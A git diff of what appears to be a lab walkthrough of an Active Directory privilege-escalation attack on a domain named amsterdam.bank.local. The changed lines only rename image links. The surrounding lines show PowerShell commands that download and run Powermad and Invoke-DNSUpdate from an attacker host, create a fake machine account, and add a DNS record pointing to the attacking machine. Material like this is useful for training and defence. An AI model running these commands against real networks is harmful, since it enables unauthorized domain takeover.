@@ -75,7 +75,7 @@ iex (iwr http://192.168.248.3:8090/Powermad.ps1 -usebasicparsing)
 New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
 ```
 
-![](<../../../../.gitbook/assets/image (56) (1) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (56) (1) (1) (1) (1) (1).png>)
 
 3\. Create a DNS record for webdav to our attacking machine with Invoke-DNSUpdate. The DNS record is required for webdav connection to work. It won't connect through an IP only with a hostname. We create a DNS record webdav.amsterdam.bank.local to our attacking machine IP.
 
@@ -84,7 +84,7 @@ iex (iwr http://192.168.248.3:8090/Invoke-DNSUpdate.ps1 -usebasicparsing)
 Invoke-DNSUpdate -DNSType A -DNSName webdav.amsterdam.bank.local -DNSData 192.168.248.3 -Realm amsterdam.bank.local
 ```
 
-![](<../../../../.gitbook/assets/image (19) (1) (1) (1) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (19) (1) (1) (1) (1) (1) (1) (1).png>)
 
 We now have all our prerequisites. Time to escalate our privileges.
 
